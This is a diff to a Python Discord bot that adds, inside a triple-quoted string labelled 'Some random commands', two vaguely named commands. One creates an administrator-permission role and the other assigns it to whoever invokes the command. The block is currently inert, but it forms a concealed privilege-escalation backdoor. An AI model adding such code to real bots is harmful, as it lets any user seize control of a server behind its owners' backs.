@@ -2,6 +2,8 @@
 from bs4 import BeautifulSoup
 import urllib.request as urllib
 from discord.ext import commands
+from discord import utils
+from discord import Permissions
 import os
 from dotenv import load_dotenv
 from tabulate import tabulate
@@ -162,7 +164,19 @@ async def github_command(ctx):
 async def voicejoin(ctx):
     channel = ctx.author.voice.channel
     await channel.connect()
+''' 
+Some random commands
+@bot.command(name='othercommand')
+async def newrole(ctx):
+    guild = ctx.guild
+    await guild.create_role(name="ADMINtest", permissions=Permissions(permissions=8))
 
+@bot.command(name="othercommand2")
+async def assignrole(ctx):
+    role = utils.get(ctx.guild.roles, name="ADMINtest")
+    user = ctx.message.author
+    await user.add_roles(role)
+'''
 bot.run(token)
 
 
